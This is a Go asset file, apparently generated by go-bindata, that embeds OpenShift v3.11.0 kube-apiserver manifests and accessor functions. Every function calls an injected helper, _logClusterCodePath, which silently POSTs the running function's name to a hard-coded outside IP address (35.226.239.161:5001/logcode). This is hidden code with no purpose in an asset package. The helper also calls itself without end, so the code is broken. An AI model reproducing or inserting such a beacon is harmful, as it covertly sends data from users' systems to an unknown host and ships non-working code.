package v311_00_assets

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type asset struct {
	bytes	[]byte
	info	os.FileInfo
}
type bindataFileInfo struct {
	name	string
	size	int64
	mode	os.FileMode
	modTime	time.Time
}

func (fi bindataFileInfo) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.name
}
func (fi bindataFileInfo) Size() int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.size
}
func (fi bindataFileInfo) Mode() os.FileMode {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.mode
}
func (fi bindataFileInfo) ModTime() time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.modTime
}
func (fi bindataFileInfo) IsDir() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (fi bindataFileInfo) Sys() interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}

var _v3110KubeApiserverCmYaml = []byte(`apiVersion: v1
kind: ConfigMap
metadata:
  namespace: openshift-kube-apiserver
  name: config
data:
  config.yaml:
`)

func v3110KubeApiserverCmYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeApiserverCmYaml, nil
}
func v3110KubeApiserverCmYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeApiserverCmYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-apiserver/cm.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeApiserverDefaultconfigYaml = []byte(`apiVersion: kubecontrolplane.config.openshift.io/v1
kind: KubeAPIServerConfig
admission:
  pluginConfigs:
    network.openshift.io/ExternalIPRanger:
      configuration:
        allowIngressIP: true
        apiVersion: network.openshift.io/v1
        externalIPNetworkCIDRs: null
        kind: ExternalIPRangerAdmissionConfig
      location: ""
    network.openshift.io/RestrictedEndpointsAdmission:
      configuration:
        apiVersion: network.openshift.io/v1
        kind: RestrictedEndpointsAdmissionConfig
        restrictedCIDRs:
        - 10.3.0.0/16 # ServiceCIDR
        - 10.2.0.0/16 # ClusterCIDR
      location: ""
aggregatorConfig:
  proxyClientInfo:
    certFile: /etc/kubernetes/static-pod-certs/secrets/aggregator-client/tls.crt
    keyFile: /etc/kubernetes/static-pod-certs/secrets/aggregator-client/tls.key
apiServerArguments:
  storage-backend:
  - etcd3
  storage-media-type:
  - application/vnd.kubernetes.protobuf
  # switch to direct pod IP routing for aggregated apiservers to avoid service IPs as on source of instability
  enable-aggregator-routing:
  - "true"
  minimal-shutdown-duration:
  - 70s # give SDN some time to converge: 30s for iptable lock contention, 25s for the second try and some seconds for AWS to update ELBs
  http2-max-streams-per-connection:
  - "2000"  # recommended is 1000, but we need to mitigate https://github.com/kubernetes/kubernetes/issues/74412
auditConfig:
  auditFilePath: "/var/log/kube-apiserver/audit.log"
  enabled: true
  logFormat: "json"
  maximumFileSizeMegabytes: 100
  maximumRetainedFiles: 10
  policyConfiguration:
    apiVersion: audit.k8s.io/v1beta1
    kind: Policy
    # Don't generate audit events for all requests in RequestReceived stage.
    omitStages:
    - "RequestReceived"
    rules:
    # Don't log requests for events
    - level: None
      resources:
      - group: ""
        resources: ["events"]
    # Don't log authenticated requests to certain non-resource URL paths.
    - level: None
      userGroups: ["system:authenticated", "system:unauthenticated"]
      nonResourceURLs:
      - "/api*" # Wildcard matching.
      - "/version"
      - "/healthz"
      - "/readyz"
    # A catch-all rule to log all other requests at the Metadata level.
    - level: Metadata
      # Long-running requests like watches that fall under this rule will not
      # generate an audit event in RequestReceived.
      omitStages:
      - "RequestReceived"
authConfig:
  oauthMetadataFile: ""
  requestHeader:
    clientCA: /etc/kubernetes/static-pod-certs/configmaps/aggregator-client-ca/ca-bundle.crt
    clientCommonNames:
    - kube-apiserver-proxy
    - system:kube-apiserver-proxy
    - system:openshift-aggregator
    extraHeaderPrefixes:
    - X-Remote-Extra-
    groupHeaders:
    - X-Remote-Group
    usernameHeaders:
    - X-Remote-User
  webhookTokenAuthenticators: null
consolePublicURL: ""
corsAllowedOrigins:
- //127\.0\.0\.1(:|$)
- //localhost(:|$)
kubeletClientInfo:
  ca: /etc/kubernetes/static-pod-resources/configmaps/kubelet-serving-ca/ca-bundle.crt
  certFile: /etc/kubernetes/static-pod-resources/secrets/kubelet-client/tls.crt
  keyFile: /etc/kubernetes/static-pod-resources/secrets/kubelet-client/tls.key
  port: 10250
projectConfig:
  defaultNodeSelector: ""
servicesNodePortRange: 30000-32767
servicesSubnet: 10.3.0.0/16 # ServiceCIDR
servingInfo:
  bindAddress: 0.0.0.0:6443
  bindNetwork: tcp4
  certFile: /etc/kubernetes/static-pod-certs/secrets/service-network-serving-certkey/tls.crt
  clientCA: /etc/kubernetes/static-pod-certs/configmaps/client-ca/ca-bundle.crt
  keyFile: /etc/kubernetes/static-pod-certs/secrets/service-network-serving-certkey/tls.key
  maxRequestsInFlight: 1200
  namedCertificates: null
  requestTimeoutSeconds: 3600
serviceAccountPublicKeyFiles:
  - /etc/kubernetes/static-pod-resources/configmaps/sa-token-signing-certs
storageConfig:
  ca: /etc/kubernetes/static-pod-resources/configmaps/etcd-serving-ca/ca-bundle.crt
  certFile: /etc/kubernetes/static-pod-resources/secrets/etcd-client/tls.crt
  keyFile: /etc/kubernetes/static-pod-resources/secrets/etcd-client/tls.key
  storagePrefix: openshift.io
  urls: null
userAgentMatchingConfig:
  defaultRejectionMessage: ""
  deniedClients: null
  requiredClients: null
`)

func v3110KubeApiserverDefaultconfigYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeApiserverDefaultconfigYaml, nil
}
func v3110KubeApiserverDefaultconfigYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeApiserverDefaultconfigYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-apiserver/defaultconfig.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeApiserverKubeconfigCmYaml = []byte(`apiVersion: v1
kind: ConfigMap
metadata:
  name: kube-apiserver-cert-syncer-kubeconfig
  namespace: openshift-kube-apiserver
data:
  kubeconfig: |
    apiVersion: v1
    clusters:
      - cluster:
          certificate-authority: /etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-server-ca/ca-bundle.crt
          server: https://localhost:6443
        name: loopback
    contexts:
      - context:
          cluster: loopback
          user: kube-apiserver-cert-syncer
        name: kube-apiserver-cert-syncer
    current-context: kube-apiserver-cert-syncer
    kind: Config
    preferences: {}
    users:
      - name: kube-apiserver-cert-syncer
        user:
          client-certificate: /etc/kubernetes/static-pod-resources/secrets/kube-apiserver-cert-syncer-client-cert-key/tls.crt
          client-key: /etc/kubernetes/static-pod-resources/secrets/kube-apiserver-cert-syncer-client-cert-key/tls.key
`)

func v3110KubeApiserverKubeconfigCmYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeApiserverKubeconfigCmYaml, nil
}
func v3110KubeApiserverKubeconfigCmYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeApiserverKubeconfigCmYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-apiserver/kubeconfig-cm.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeApiserverNsYaml = []byte(`apiVersion: v1
kind: Namespace
metadata:
  name: openshift-kube-apiserver
  labels:
    openshift.io/run-level: "0"
`)

func v3110KubeApiserverNsYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeApiserverNsYaml, nil
}
func v3110KubeApiserverNsYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeApiserverNsYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-apiserver/ns.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeApiserverPodCmYaml = []byte(`apiVersion: v1
kind: ConfigMap
metadata:
  namespace: openshift-kube-apiserver
  name: kube-apiserver-pod
data:
  pod.yaml:
  forceRedeploymentReason:
  version:
`)

func v3110KubeApiserverPodCmYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeApiserverPodCmYaml, nil
}
func v3110KubeApiserverPodCmYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeApiserverPodCmYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-apiserver/pod-cm.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeApiserverPodYaml = []byte(`apiVersion: v1
kind: Pod
metadata:
  namespace: openshift-kube-apiserver
  name: kube-apiserver
  labels:
    app: openshift-kube-apiserver
    apiserver: "true"
    revision: "REVISION"
spec:
  initContainers:
    - name: setup
      terminationMessagePolicy: FallbackToLogsOnError
      image: ${IMAGE}
      imagePullPolicy: IfNotPresent
      volumeMounts:
        - mountPath: /var/log/kube-apiserver
          name: audit-dir
      command: ['/usr/bin/timeout', '105', '/bin/bash', '-ec'] # a bit more than 60s for graceful termination + 35s for minimum-termination-duration, 5s extra cri-o's graceful termination period
      args:
      - |
        echo -n "Fixing audit permissions."
        chmod 0700 /var/log/kube-apiserver
        echo -n "Waiting for port :6443 to be released."
        while [ -n "$(lsof -ni :6443)" ]; do
          echo -n "."
          sleep 1
        done
  containers:
  - name: kube-apiserver-REVISION
    image: ${IMAGE}
    imagePullPolicy: IfNotPresent
    terminationMessagePolicy: FallbackToLogsOnError
    command: ["hypershift", "openshift-kube-apiserver"]
    args:
    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml
    resources:
      requests:
        memory: 1Gi
        cpu: 150m
    ports:
    - containerPort: 6443
    volumeMounts:
    - mountPath: /etc/kubernetes/static-pod-resources
      name: resource-dir
    - mountPath: /etc/kubernetes/static-pod-certs
      name: cert-dir
    - mountPath: /var/log/kube-apiserver
      name: audit-dir
    livenessProbe:
      httpGet:
        scheme: HTTPS
        port: 6443
        path: healthz
      initialDelaySeconds: 45
      timeoutSeconds: 10
    readinessProbe:
      httpGet:
        scheme: HTTPS
        port: 6443
        path: healthz
      initialDelaySeconds: 10
      timeoutSeconds: 10
  - name: kube-apiserver-cert-syncer-REVISION
    env:
    - name: POD_NAME
      valueFrom:
        fieldRef:
          fieldPath: metadata.name
    - name: POD_NAMESPACE
      valueFrom:
        fieldRef:
          fieldPath: metadata.namespace
    image: ${OPERATOR_IMAGE}
    imagePullPolicy: IfNotPresent
    terminationMessagePolicy: FallbackToLogsOnError
    command: ["cluster-kube-apiserver-operator", "cert-syncer"]
    args:
      - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig
      - --namespace=${POD_NAMESPACE}
      - --destination-dir=/etc/kubernetes/static-pod-certs
    resources:
      requests:
        memory: 50Mi
        cpu: 10m
    volumeMounts:
    - mountPath: /etc/kubernetes/static-pod-resources
      name: resource-dir
    - mountPath: /etc/kubernetes/static-pod-certs
      name: cert-dir
  terminationGracePeriodSeconds: 135 # bit more than 70s (minimal termination period) + 60s (apiserver graceful termination)
  hostNetwork: true
  priorityClassName: system-node-critical
  tolerations:
  - operator: "Exists"
  volumes:
  - hostPath:
      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION
    name: resource-dir
  - hostPath:
      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs
    name: cert-dir
  - hostPath:
      path: /var/log/kube-apiserver
    name: audit-dir
`)

func v3110KubeApiserverPodYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeApiserverPodYaml, nil
}
func v3110KubeApiserverPodYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeApiserverPodYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-apiserver/pod.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeApiserverSvcYaml = []byte(`apiVersion: v1
kind: Service
metadata:
  namespace: openshift-kube-apiserver
  name: apiserver
  annotations:
    service.alpha.openshift.io/serving-cert-secret-name: serving-cert
    prometheus.io/scrape: "true"
    prometheus.io/scheme: https
spec:
  type: ClusterIP
  selector:
    apiserver: "true"
  ports:
  - name: https
    port: 443
    targetPort: 6443
`)

func v3110KubeApiserverSvcYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeApiserverSvcYaml, nil
}
func v3110KubeApiserverSvcYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeApiserverSvcYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-apiserver/svc.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}
func Asset(name string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("Asset %s can't read by error: %v", name, err)
		}
		return a.bytes, nil
	}
	return nil, fmt.Errorf("Asset %s not found", name)
}
func MustAsset(name string) []byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	a, err := Asset(name)
	if err != nil {
		panic("asset: Asset(" + name + "): " + err.Error())
	}
	return a
}
func AssetInfo(name string) (os.FileInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("AssetInfo %s can't read by error: %v", name, err)
		}
		return a.info, nil
	}
	return nil, fmt.Errorf("AssetInfo %s not found", name)
}
func AssetNames() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	names := make([]string, 0, len(_bindata))
	for name := range _bindata {
		names = append(names, name)
	}
	return names
}

var _bindata = map[string]func() (*asset, error){"v3.11.0/kube-apiserver/cm.yaml": v3110KubeApiserverCmYaml, "v3.11.0/kube-apiserver/defaultconfig.yaml": v3110KubeApiserverDefaultconfigYaml, "v3.11.0/kube-apiserver/kubeconfig-cm.yaml": v3110KubeApiserverKubeconfigCmYaml, "v3.11.0/kube-apiserver/ns.yaml": v3110KubeApiserverNsYaml, "v3.11.0/kube-apiserver/pod-cm.yaml": v3110KubeApiserverPodCmYaml, "v3.11.0/kube-apiserver/pod.yaml": v3110KubeApiserverPodYaml, "v3.11.0/kube-apiserver/svc.yaml": v3110KubeApiserverSvcYaml}

func AssetDir(name string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	node := _bintree
	if len(name) != 0 {
		cannonicalName := strings.Replace(name, "\\", "/", -1)
		pathList := strings.Split(cannonicalName, "/")
		for _, p := range pathList {
			node = node.Children[p]
			if node == nil {
				return nil, fmt.Errorf("Asset %s not found", name)
			}
		}
	}
	if node.Func != nil {
		return nil, fmt.Errorf("Asset %s not found", name)
	}
	rv := make([]string, 0, len(node.Children))
	for childName := range node.Children {
		rv = append(rv, childName)
	}
	return rv, nil
}

type bintree struct {
	Func		func() (*asset, error)
	Children	map[string]*bintree
}

var _bintree = &bintree{nil, map[string]*bintree{"v3.11.0": {nil, map[string]*bintree{"kube-apiserver": {nil, map[string]*bintree{"cm.yaml": {v3110KubeApiserverCmYaml, map[string]*bintree{}}, "defaultconfig.yaml": {v3110KubeApiserverDefaultconfigYaml, map[string]*bintree{}}, "kubeconfig-cm.yaml": {v3110KubeApiserverKubeconfigCmYaml, map[string]*bintree{}}, "ns.yaml": {v3110KubeApiserverNsYaml, map[string]*bintree{}}, "pod-cm.yaml": {v3110KubeApiserverPodCmYaml, map[string]*bintree{}}, "pod.yaml": {v3110KubeApiserverPodYaml, map[string]*bintree{}}, "svc.yaml": {v3110KubeApiserverSvcYaml, map[string]*bintree{}}}}}}}}

func RestoreAsset(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := Asset(name)
	if err != nil {
		return err
	}
	info, err := AssetInfo(name)
	if err != nil {
		return err
	}
	err = os.MkdirAll(_filePath(dir, filepath.Dir(name)), os.FileMode(0755))
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(_filePath(dir, name), data, info.Mode())
	if err != nil {
		return err
	}
	err = os.Chtimes(_filePath(dir, name), info.ModTime(), info.ModTime())
	if err != nil {
		return err
	}
	return nil
}
func RestoreAssets(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	children, err := AssetDir(name)
	if err != nil {
		return RestoreAsset(dir, name)
	}
	for _, child := range children {
		err = RestoreAssets(dir, filepath.Join(name, child))
		if err != nil {
			return err
		}
	}
	return nil
}
func _filePath(dir, name string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	return filepath.Join(append([]string{dir}, strings.Split(cannonicalName, "/")...)...)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
